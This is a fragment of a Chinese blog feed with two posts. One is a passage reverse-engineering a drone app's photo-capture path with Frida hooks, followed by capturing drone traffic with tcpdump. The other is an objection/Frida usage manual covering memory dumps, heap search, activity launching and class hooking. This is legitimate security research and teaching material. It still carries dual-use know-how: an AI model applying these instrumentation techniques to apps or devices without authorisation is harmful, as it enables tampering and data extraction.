class="line">&#125;</span><br></pre></td></tr></table></figure><p>这只是在拍照前发送获取状态和容量的数据包，然而拍照却不是这里。</p><p>可以尝试hook <code>b()</code>方法进行验证：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookb</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.g.a.m.q&quot;</span>).<span class="title function_">b</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hookb()</span><br></pre></td></tr></table></figure><p>包抓到了，但是没进行拍照，可以确定这个只是单纯获取状态和容量的。</p><p>可以看到在快门键中有一个条件判断。查看变量<code>B0</code>的赋值：</p><img src="/posts/ac4cb042/7.2.2.jpg" class=""><img src="/posts/ac4cb042/7.2.3.png" class=""><p>在<code>A0()</code>方法中，如果现在的状态是“拍照”，则返回true；如果是“录像”，则返回false。如果是“拍照”，执行<code>D0()</code>方法。</p><img src="/posts/ac4cb042/7.2.4.png" class=""><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">D0</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//获取当前系统时间，以毫秒为单位</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">currentTimeMillis</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">    <span class="comment">//Java中类成员变量初始值默认为0</span></span><br><span class="line">    <span class="keyword">if</span> (currentTimeMillis - <span class="built_in">this</span>.h0 &gt; <span class="number">800</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.h0 = currentTimeMillis;</span><br><span class="line">        c.i.a.i.a.b(<span class="built_in">this</span>, MediaPixel.P_4K, <span class="keyword">new</span> <span class="title class_">l</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试hook <code>D0()</code>方法，看是否经过了它：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.g.a.h.d&quot;</span>).<span class="property">D0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">D0</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;)      </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>实验证明确实是经过了。将<code>this.D0()</code>这一句注释掉后，发现按下快门键不拍照了，说明获取图片信息就在<code>D0()</code>方法中。<code>D0()</code>只调用了一个方法：<code>c.i.a.i.a.b()</code>，可以先看一下它的参数是什么。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.i.a.i.a&quot;</span>).<span class="property">b</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1,arg2,arg3</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1,arg2,arg3 =&gt; &quot;</span>,arg1,arg2,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg3));</span><br><span class="line">            <span class="comment">//this.b(arg1,arg2,arg3);</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;)      </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/7.2.16.png" class=""><img src="/posts/ac4cb042/7.2.17.png" class=""><p><code>new l()</code> -&gt; <code>c.g.a.m.p.f()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">l</span> <span class="keyword">implements</span> <span class="title class_">c</span>.i.a.j.c &#123;</span><br><span class="line">       l() &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="meta">@Override</span> <span class="comment">// c.i.a.j.c</span></span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">b</span><span class="params">()</span> &#123;</span><br><span class="line">           c.g.a.m.p.f(d.<span class="built_in">this</span>.U(), c.g.a.d.n);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//n=0x7F0D0025</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">2131558437</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> <span class="keyword">extends</span> <span class="title class_">c</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> Context <span class="title function_">U</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">(Context context, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (f3899c) &#123;</span><br><span class="line">           c().load(context, i, <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在AK中可以知道这个资源ID是照片。</p><img src="/posts/ac4cb042/7.2.6.jpg" class=""><p>网上对Context的理解：当前对象在程序中所处的一个环境，一个与系统交互的过程。 比如QQ和朋友聊天时，此时的Context是指的聊天界面以及相关的数据请求与传输，Context在加载资源、启动Activity、获取系统服务、创建View等操作都要参与。</p><p><code>c.g.a.m.p.f()</code> -&gt; <code>c()</code>：</p><p><code>c()</code>是SoundPool对象的一个实例，其中它的<code>load()</code>方法声明如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过resID从APK资源中载入</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">load</span><span class="params">(Context context, <span class="type">int</span> resId, <span class="type">int</span> priority)</span></span><br></pre></td></tr></table></figure><p><code>D0()</code> -&gt; <code>c.i.a.i.a.b()</code> -&gt; <code>c.i.a.i.a.c()</code>：</p><img src="/posts/ac4cb042/7.2.5.png" class=""><p><code>c.i.a.i.b.a()</code>方法的功能是根据拍照质量选择对应的像素。</p><p><code>c.i.a.g.j.d.k().q()</code>方法是设置水印。</p><p><code>c.i.a.g.j.d.k().n()</code>方法传入<code>l()</code>的一个实例。</p><p><code>c.i.a.f.b.f3940c()</code>是String型，查看哪里给它赋值了。</p><img src="/posts/ac4cb042/7.2.7.png" class=""><img src="/posts/ac4cb042/7.2.8.png" class=""><p>很明显就是在特定路径下创建了一个目录，并取绝对文件路径。</p><p>将这个文件路径作为参数传入<code>com.vison.baselibrary.utils.c.a()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">a</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">format</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyyMMdd_HHmmsss&quot;</span>, Locale.ENGLISH).format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(str, <span class="string">&quot;IMG_&quot;</span> + format + <span class="string">&quot;.jpg&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该目录下创建了一个名字以“IMG_”开头，“.jpg”结尾，中间是当前日期时间的文件。尝试hook这个<code>a()</code>方法可以得到照片在手机中的路径，最终返回一个File类的实例。</p><img src="/posts/ac4cb042/7.2.14.png" class=""><p>并将该实例作为参数传入<code>e.g().o()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">o</span><span class="params">(File file)</span> &#123;</span><br><span class="line">    c.i.a.h.e.<span class="type">a</span> <span class="variable">aVar</span> <span class="operator">=</span> <span class="built_in">this</span>.f4105d;</span><br><span class="line">    <span class="keyword">if</span> (aVar != <span class="literal">null</span>) &#123;</span><br><span class="line">        aVar.a(file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>o()</code>只调用了一个<code>a()</code>方法，所以直接hook <code>a()</code>方法看是否经过它。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.i.a.h.e.a&quot;</span>).<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1=&gt; &quot;</span>,arg1);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">a</span>(arg1);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;)      </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>是经过了，但<code>a()</code>方法构造如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">(File file)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.f4123d = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">this</span>.f = file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>this.f</code>在哪里被调用到：</p><img src="/posts/ac4cb042/7.2.18.png" class=""><img src="/posts/ac4cb042/7.2.19.png" class=""><p>那就直接hook <code>l()</code>方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.i.a.g.j.d&quot;</span>).<span class="property">l</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1,arg2,arg3,arg4</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1,arg2,arg3,arg4=&gt; &quot;</span>,arg1,arg2,arg3,arg4);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">l</span>(arg1,arg2,arg3,arg4);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;)      </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/7.2.20.png" class=""><p>四个参数依次是File类引用、屏幕的分辨率1794<em>1080(把手机侧边的虚拟按键去掉就可以1920\</em>1080)、true。true是什么意思呢？将它改为false发现照片上下翻转了，就是实现照片上下翻转功能。</p><p><code>l()</code>方法最终调用<code>m()</code>方法：</p><img src="/posts/ac4cb042/7.2.21.png" class=""><p>直接hook <code>f()</code>方法试试吧。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.i.a.g.j.b&quot;</span>).<span class="property">f</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">f</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;)      </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>同样注释掉<code>this.f()</code>拍不了照，继续看发现最终调用<code>i()</code>方法创建了一个新线程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">c</span> <span class="variable">cVar</span> <span class="operator">=</span> <span class="built_in">this</span>.f4019b;</span><br><span class="line">    <span class="keyword">if</span> (cVar == <span class="literal">null</span>) &#123;</span><br><span class="line">        com.vison.baselibrary.utils.g.a(<span class="string">&quot;未初始化&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cVar.i();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">i</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="built_in">this</span>, c.class.getSimpleName()).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那照片是如何存到SD卡中呢？我们发现它不仅有<code>.jpg</code>格式的文件，还有同名的<code>.thm</code>文件，有些视频播放器除了需要MP4或者MPG格式的视频文件外，还需要一个THM格式的索引文件才能播放（所以关JPG格式什么事）。在jadx中搜索“thm”果然有相关信息。</p><img src="/posts/ac4cb042/7.2.15.png" class=""><p>根据上下文分析，这个<code>run()</code>方法的主要功能是将指定目录下的所有<code>.jpg</code>文件放入一个列表，再从该列表中依次取出元素，将每个元素的后缀名改为<code>.thm</code>，按指定格式写入当前目录。</p><p>（我在干嘛…不想做了）</p><p>拍照、录像、手势拍照、手势录像。</p><hr><p>上面说到，如果把tcpdump放入手机中，只能抓手机与无人机通信的包，而将tcpdump放在无人机中，就可以同时抓到无人机与遥控器、无人机与手机通信的包了。如何将tcpdump放进去呢？使用tftp工具或SD卡都可以。tcpdump 4.99.1 / 1.10.1 版本太新，无人机系统不兼容，所以选择tcpdump 4.9.2 / 1.9.0。</p><p>在抓包前，查看当前环境：</p><ul><li>无人机：172.16.10.1</li><li>遥控器：172.16.10.10</li><li>手机：172.16.10.20</li><li>物理机：172.16.10.21</li><li>虚拟机：172.16.10.22</li></ul><p>执行抓包命令就可以知道无人机在跟哪些IP通信。</p><img src="/posts/ac4cb042/8.1.3.png" class="">]]></content>
    
    
    <summary type="html">&lt;p&gt;第一次尝试对无人机App分析，这个是纯对App进行分析，参考度较低，建议结合&lt;a href=&quot;https://v5le0n9.github.io/posts/8a5081f6.html&quot;&gt;无人机漏洞挖掘学习&lt;/a&gt;食用。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Frida逆向与利用自动化</title>
    <link href="http://example.com/posts/ab7319a3.html"/>
    <id>http://example.com/posts/ab7319a3.html</id>
    <published>2022-08-15T12:29:33.258Z</published>
    <updated>2022-12-01T07:15:43.936Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章记录一下objection和frida的使用方法，相当于操作手册。</p><span id="more"></span><h1 id="1-objection"><a href="#1-objection" class="headerlink" title="1. objection"></a>1. objection</h1><p>objection功能强大，命令众多，而且不用写一行代码，便可实现诸如内存搜索、类和模块搜索、方法hook打印参数返回值调用栈等常用功能，是一个非常方便的，逆向必备、内存漫游神器。</p><img src="/posts/ab7319a3/1.1.1.png" class="" title="objection界面"><p>下面以安卓内置应用“设置”为例，示范一下objection的基本用法。</p><p>运行“设置”App，启动frida-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# adb shell                                                         </span><br><span class="line">bullhead:/ $ su -</span><br><span class="line">bullhead:/ # cd /data/local/tmp</span><br><span class="line">bullhead:/data/local/tmp # ./frida-server-12.8.0-android-arm64  </span><br></pre></td></tr></table></figure><p>查看“设置”应用的包名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# frida-ps -U|grep -i setting</span><br><span class="line">5649  com.android.settings</span><br></pre></td></tr></table></figure><p>再使用objection注入“设置”应用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.android.settings explore</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.1.2.png" class="" title="objection界面"><h2 id="1-1-获取基本信息"><a href="#1-1-获取基本信息" class="headerlink" title="1.1 获取基本信息"></a>1.1 获取基本信息</h2><p>启动objection之后，会出现提示它的logo，这时候不知道输入什么命令的话，可以按下空格，有提示的命令及其功能出来；再按空格选中，又会有新的提示命令出来，这时候按回车就可以执行该命令。</p><p>如果不知道当前命令的效果是什么，在当前命令前加help，比如help env，回车之后会出现当前命令的解释信息。</p><img src="/posts/ab7319a3/1.1.3.png" class="" title="helpenv"><p>objection还有一个jobs(作业系统)，建议一定要掌握，可以同时运行多项(hook)作业。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # jobs list                      </span><br><span class="line">Job ID  Hooks  Type</span><br><span class="line">------  -----  ----</span><br></pre></td></tr></table></figure><h2 id="1-2-提取内存信息"><a href="#1-2-提取内存信息" class="headerlink" title="1.2 提取内存信息"></a>1.2 提取内存信息</h2><p>查看内存中加载的库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory list modules</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.1.4.png" class="" title="查看内存中加载的库"><p>查看库中的导出函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory list exports libssl.so</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.2.1.png" class="" title="查看库中的导出函数"><p>如果输出结果太多，终端无法全部显示的时候，可以将结果导出到文件中，然后使用其他软件查看内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory list exports libart.so --json /root/libart.json</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.2.2.png" class="" title="导出到文件"><p>提取整个(或部分)内存到当前目录的from_base文件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory dump all from_base</span><br></pre></td></tr></table></figure><p>搜索整个内存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory search --string --offsets-only</span><br></pre></td></tr></table></figure><h2 id="1-3-内存堆搜索与执行"><a href="#1-3-内存堆搜索与执行" class="headerlink" title="1.3 内存堆搜索与执行"></a>1.3 内存堆搜索与执行</h2><p>我们查看AOSP源码关于设置里显示系统设置的部分，发现存在着DisplaySettings类，可以在堆上搜索是否存在着该类的实例。首先在手机上点击进入“显示”设置，然后运行以下命令，并得到相应的实例地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android heap search instances com.android.settings.DisplaySettings</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.2.3.png" class="" title="在堆上搜索实例"><p>查看源码得知com.android.settings.DisplaySettings类有着<code>getPreferenceScreenResId()</code>方法，这样就可以直接调用该实例的<code>getPreferenceScreenResId()</code>方法，用excute命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android heap execute 0x22a2 getPreferenceScreenResId</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.3.1.png" class="" title="调用实例的方法"><p>也可以在找到的实例上直接编写js脚本，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android heap evaluate 0x22a2</span><br></pre></td></tr></table></figure><p>命令后，会进入一个迷你编辑器环境，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;evaluate result:&quot;+clazz.getPreferenceScreenResId())</span><br></pre></td></tr></table></figure><p>这串脚本，按ESC退出编辑器，然后按回车，即会开始执行这串脚本，输出结果。</p><img src="/posts/ab7319a3/1.3.2.png" class="" title="调用实例的方法"><p>这个功能非常厉害，可以即时编写、出结果、即时调试自己的代码，不用再编写→注入→操作→看结果→再调整，而是直接出结果。</p><h2 id="1-4-启动activity或service"><a href="#1-4-启动activity或service" class="headerlink" title="1.4 启动activity或service"></a>1.4 启动activity或service</h2><p>直接某个启动activity：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android intent launch_activity com.android.settings.DisplaySettings </span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.3.3.png" class="" title="启动activity"><p>查看当前可用的activity：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list activities</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.4.1.png" class="" title="查看当前可用的activity"><p>启动service：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android intent launch_service com.android.settings.bluetooth.BluetoothPairingService</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.4.2.png" class="" title="启动service"><h2 id="1-5-内存漫游"><a href="#1-5-内存漫游" class="headerlink" title="1.5 内存漫游"></a>1.5 内存漫游</h2><p>列出内存中所有的类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.4.3.png" class="" title="列出内存中所有的类"><p>在内存中所有已加载的类中搜索包含特定关键词的类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes display</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.1.png" class="" title="在内存中所有已加载的类中搜索包含特定关键词的类"><p>在内存中所有已加载的类的方法中搜索包含特定关键词的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search methods display</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.2.png" class="" title="在内存中所有已加载的类的方法中搜索包含特定关键词的方法"><p>列出指定类的所有方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list class_methods com.android.settings.DisplaySettings</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.3.png" class="" title="列出指定类的所有方法"><p>在列出类的方法时，还直接把参数也提供了，也就是说我们可以直接动手写hook了，既然上述写hook的要素已经全部都有了，objection这个“自动化”工具，当然可以直接生成代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking generate  simple  com.android.settings.DisplaySettings</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.4.png" class="" title="直接生成代码"><p>生成的代码大部分要素都有了，只是参数貌似没有填上，还是需要我们后续补充一些，看来还是无法做到完美。</p><h2 id="1-6-hook"><a href="#1-6-hook" class="headerlink" title="1.6 hook"></a>1.6 hook</h2><p>上述操作均是基于在内存中直接枚举搜索，已经可以获取到大量有用的静态信息，我们再来介绍几个方法，可以获取到执行时动态的信息。</p><p>我们以手机连接蓝牙耳机播放音乐为例为例，看看手机蓝牙接口的动态信息。</p><p>首先我们将手机连接上我的蓝牙耳机，并可以正常播放音乐；然后我们按照上文的方法，搜索一下与蓝牙相关的类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes bluetooth</span><br></pre></td></tr></table></figure><p>搜到一个高度可疑的类：android.bluetooth.BluetoothDevice。运行以下命令，hook这个类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class android.bluetooth.BluetoothDevice</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.6.png" class="" title="hook类"><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jobs list</span><br></pre></td></tr></table></figure><p>可以看到objection为我们创建的hooks数为55，也就是将android.bluetooth.BluetoothDevice类下的所有方法都hook了。</p><img src="/posts/ab7319a3/1.5.5.png" 